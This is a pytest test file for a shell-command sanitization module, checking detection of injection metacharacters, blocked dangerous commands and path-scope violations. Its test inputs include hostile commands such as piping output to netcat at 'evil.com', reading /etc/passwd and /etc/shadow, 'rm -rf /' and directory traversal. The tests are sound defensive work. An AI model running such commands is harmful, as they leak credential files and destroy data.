"""Tests for the sanitization module."""

import os
import tempfile
import pytest
from ..sanitization import (
    SanitizationConfig,
    SanitizationResult,
    PathScopeConfig,
    check_shell_injection,
    check_dangerous_command,
    check_path_scope,
    sanitize_command,
    extract_paths_from_command,
    create_strict_config,
    create_permissive_config,
    SHELL_METACHARACTERS,
    DANGEROUS_COMMANDS,
)


class TestCheckShellInjection:
    """Tests for shell injection detection."""

    def test_clean_command(self):
        result = check_shell_injection("git status")
        assert result.is_safe
        assert not result.violations

    def test_semicolon_injection(self):
        result = check_shell_injection("ls; cat /etc/passwd")
        assert not result.is_safe
        assert any(";" in v for v in result.violations)

    def test_pipe_injection(self):
        result = check_shell_injection("ls | nc evil.com 80")
        assert not result.is_safe
        assert any("|" in v for v in result.violations)

    def test_background_execution(self):
        result = check_shell_injection("malware &")
        assert not result.is_safe
        assert any("&" in v for v in result.violations)

    def test_backtick_substitution(self):
        result = check_shell_injection("echo `whoami`")
        assert not result.is_safe
        assert any("`" in v for v in result.violations)

    def test_dollar_paren_substitution(self):
        result = check_shell_injection("echo $(cat /etc/passwd)")
        assert not result.is_safe
        # $ is detected as shell metacharacter OR $( pattern is detected
        assert any("$" in v for v in result.violations)

    def test_dollar_brace_expansion(self):
        result = check_shell_injection("echo ${HOME}")
        assert not result.is_safe
        # $ is detected as shell metacharacter OR ${ pattern is detected
        assert any("$" in v for v in result.violations)

    def test_output_redirection(self):
        result = check_shell_injection("echo data > /etc/passwd")
        assert not result.is_safe
        assert any(">" in v for v in result.violations)

    def test_input_redirection(self):
        result = check_shell_injection("cat < /etc/shadow")
        assert not result.is_safe
        assert any("<" in v for v in result.violations)

    def test_newline_injection(self):
        result = check_shell_injection("ls\ncat /etc/passwd")
        assert not result.is_safe
        assert any("\\n" in v for v in result.violations)

    def test_all_metacharacters_blocked(self):
        """Ensure all defined metacharacters are detected."""
        for char in SHELL_METACHARACTERS:
            if char in ('\n', '\r'):
                cmd = f"ls{char}whoami"
            else:
                cmd = f"ls {char} whoami"
            result = check_shell_injection(cmd)
            assert not result.is_safe, f"Metacharacter {repr(char)} not detected"


class TestCheckDangerousCommand:
    """Tests for dangerous command detection."""

    def test_safe_command(self):
        config = SanitizationConfig()
        result = check_dangerous_command("git status", config)
        assert result.is_safe

    def test_sudo_blocked(self):
        config = SanitizationConfig(block_dangerous_commands=True)
        result = check_dangerous_command("sudo apt update", config)
        assert not result.is_safe
        assert any("sudo" in v for v in result.violations)

    def test_rm_blocked(self):
        config = SanitizationConfig(block_dangerous_commands=True)
        result = check_dangerous_command("rm -rf /tmp/test", config)
        assert not result.is_safe
        assert any("rm" in v for v in result.violations)

    def test_curl_blocked(self):
        config = SanitizationConfig(block_dangerous_commands=True)
        result = check_dangerous_command("curl https://example.com", config)
        assert not result.is_safe

    def test_allowed_dangerous_command(self):
        config = SanitizationConfig(
            block_dangerous_commands=True,
            allowed_dangerous_commands={"rm", "curl"}
        )
        result = check_dangerous_command("rm file.txt", config)
        assert result.is_safe

    def test_custom_blocked_command(self):
        config = SanitizationConfig(
            block_dangerous_commands=True,
            custom_blocked_commands={"custom_danger"}
        )
        result = check_dangerous_command("custom_danger --arg", config)
        assert not result.is_safe

    def test_blocking_disabled(self):
        # Note: check_dangerous_command always checks - the block_dangerous_commands flag
        # is respected by sanitize_command which decides whether to call this function.
        # To test disabled blocking, use sanitize_command with block_dangerous_commands=False
        config = SanitizationConfig(
            block_shell_metacharacters=False,
            block_dangerous_commands=False
        )
        result = sanitize_command("sudo rm -rf /tmp/test", config)
        assert result.is_safe

    def test_all_dangerous_commands_blocked(self):
        """Ensure all defined dangerous commands are detected."""
        config = SanitizationConfig(block_dangerous_commands=True)
        for cmd in DANGEROUS_COMMANDS:
            result = check_dangerous_command(f"{cmd} --help", config)
            assert not result.is_safe, f"Dangerous command {cmd} not blocked"

    def test_command_with_path(self):
        """Commands with paths should still be detected."""
        config = SanitizationConfig(block_dangerous_commands=True)
        result = check_dangerous_command("/usr/bin/sudo apt update", config)
        assert not result.is_safe


class TestExtractPathsFromCommand:
    """Tests for path extraction from commands."""

    def test_simple_path(self):
        paths = extract_paths_from_command("cat ./file.txt")
        assert "./file.txt" in paths

    def test_absolute_path(self):
        paths = extract_paths_from_command("cat /etc/passwd")
        assert "/etc/passwd" in paths

    def test_relative_path(self):
        paths = extract_paths_from_command("cat ../secret.txt")
        assert "../secret.txt" in paths

    def test_home_path(self):
        paths = extract_paths_from_command("cat ~/.bashrc")
        assert "~/.bashrc" in paths

    def test_skip_flags(self):
        paths = extract_paths_from_command("ls -la ./dir")
        assert "-la" not in paths
        assert "./dir" in paths

    def test_multiple_paths(self):
        paths = extract_paths_from_command("cp ./src.txt /tmp/dst.txt")
        assert "./src.txt" in paths
        assert "/tmp/dst.txt" in paths

    def test_filename_with_extension(self):
        paths = extract_paths_from_command("python script.py")
        assert "script.py" in paths


class TestCheckPathScope:
    """Tests for path scope validation."""

    def test_relative_path_allowed(self):
        config = PathScopeConfig(allowed_roots=["."])
        result = check_path_scope("./file.txt", config)
        assert result.is_safe

    def test_absolute_path_blocked(self):
        config = PathScopeConfig(block_absolute=True)
        result = check_path_scope("/etc/passwd", config)
        assert not result.is_safe
        assert any("Absolute" in v for v in result.violations)

    def test_parent_traversal_blocked(self):
        config = PathScopeConfig(block_parent_traversal=True)
        result = check_path_scope("../secret.txt", config)
        assert not result.is_safe
        assert any("traversal" in v.lower() for v in result.violations)

    def test_home_path_blocked(self):
        config = PathScopeConfig(allow_home=False)
        result = check_path_scope("~/.bashrc", config)
        assert not result.is_safe
        assert any("Home" in v for v in result.violations)

    def test_home_path_allowed(self):
        config = PathScopeConfig(allow_home=True)
        result = check_path_scope("~/.bashrc", config)
        # Note: This checks syntax only, actual resolution depends on cwd
        assert result.is_safe or "Home" not in str(result.violations)

    def test_path_within_allowed_root(self):
        with tempfile.TemporaryDirectory() as tmpdir:
            config = PathScopeConfig(
                allowed_roots=[tmpdir],
                block_absolute=False
            )
            test_path = os.path.join(tmpdir, "test.txt")
            result = check_path_scope(test_path, config, cwd=tmpdir)
            assert result.is_safe

    def test_path_outside_allowed_root(self):
        with tempfile.TemporaryDirectory() as tmpdir:
            config = PathScopeConfig(
                allowed_roots=[tmpdir],
                block_absolute=False
            )
            result = check_path_scope("/etc/passwd", config, cwd=tmpdir)
            assert not result.is_safe

    def test_sneaky_traversal_blocked(self):
        """Paths like ./foo/../../../etc should be blocked."""
        config = PathScopeConfig(block_parent_traversal=True)
        result = check_path_scope("./foo/../../../etc/passwd", config)
        assert not result.is_safe


class TestSanitizeCommand:
    """Tests for full command sanitization."""

    def test_clean_command_passes(self):
        config = SanitizationConfig(
            block_shell_metacharacters=True,
            block_dangerous_commands=True
        )
        result = sanitize_command("git status", config)
        assert result.is_safe

    def test_injection_fails(self):
        config = SanitizationConfig(block_shell_metacharacters=True)
        result = sanitize_command("ls; rm -rf /", config)
        assert not result.is_safe

    def test_dangerous_command_fails(self):
        config = SanitizationConfig(block_dangerous_commands=True)
        result = sanitize_command("sudo apt update", config)
        assert not result.is_safe

    def test_path_scope_fails(self):
        with tempfile.TemporaryDirectory() as tmpdir:
            config = SanitizationConfig(
                path_scope=PathScopeConfig(
                    allowed_roots=[tmpdir],
                    block_absolute=True
                )
            )
            result = sanitize_command("cat /etc/passwd", config, cwd=tmpdir)
            assert not result.is_safe

    def test_multiple_violations(self):
        config = SanitizationConfig(
            block_shell_metacharacters=True,
            block_dangerous_commands=True
        )
        result = sanitize_command("sudo rm -rf /; cat /etc/passwd", config)
        assert not result.is_safe
        assert len(result.violations) > 1

    def test_all_checks_disabled(self):
        config = SanitizationConfig(
            block_shell_metacharacters=False,
            block_dangerous_commands=False,
            path_scope=None
        )
        result = sanitize_command("sudo rm -rf /; cat /etc/passwd", config)
        assert result.is_safe


class TestCreateStrictConfig:
    """Tests for strict config factory."""

    def test_strict_config_basics(self):
        config = create_strict_config("/tmp/workspace")
        assert config.block_shell_metacharacters
        assert config.block_dangerous_commands
        assert config.path_scope is not None

    def test_strict_config_path_scope(self):
        config = create_strict_config("/tmp/workspace")
        assert config.path_scope.block_absolute
        assert config.path_scope.block_parent_traversal
        assert not config.path_scope.allow_home

    def test_strict_config_allowed_root(self):
        config = create_strict_config("/my/workspace")
        assert "/my/workspace" in config.path_scope.allowed_roots


class TestCreatePermissiveConfig:
    """Tests for permissive config factory."""

    def test_permissive_config_basics(self):
        config = create_permissive_config()
        assert config.block_shell_metacharacters
        assert config.block_dangerous_commands

    def test_permissive_config_allows_rm(self):
        config = create_permissive_config()
        assert "rm" in config.allowed_dangerous_commands

    def test_permissive_config_no_path_scope(self):
        config = create_permissive_config()
        assert config.path_scope is None
